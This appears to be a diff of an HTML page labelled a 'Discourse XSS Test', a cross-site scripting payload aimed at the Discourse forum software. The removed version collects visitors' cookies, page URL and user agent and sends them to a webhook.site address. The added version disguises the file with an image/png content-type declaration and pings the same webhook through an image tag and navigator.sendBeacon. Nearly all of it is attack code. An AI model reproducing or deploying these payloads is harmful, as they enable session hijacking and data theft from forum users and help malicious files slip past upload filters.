@@ -1,24 +1,31 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Discourse XSS Test</title>
+
+
+  <meta http-equiv="Content-Type" content="image/png">
+
 </head>
+
 <body>
-  <h1>Discourse XSS Test Page</h1>
+
+
+  <img src="https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3?test=img_payload" />
 
   <script>
-    // Simulate data collection
-    const payload = {
-      url: window.location.href,
-      userAgent: navigator.userAgent,
-      cookies: document.cookie
-    };
 
-    // Encode data in query string
-    const encoded = encodeURIComponent(JSON.stringify(payload));
 
-    // Send to webhook via image request (CORS-safe)
-    new Image().src = `https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3?data=${encoded}`;
+    navigator.sendBeacon(
+
+
+      "https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3",
+
+
+      new Blob([JSON.stringify({ from: "beacon" })], { type: "application/json" })
+
+
+    );
+
+
   </script>
+
 </body>
+
 </html>
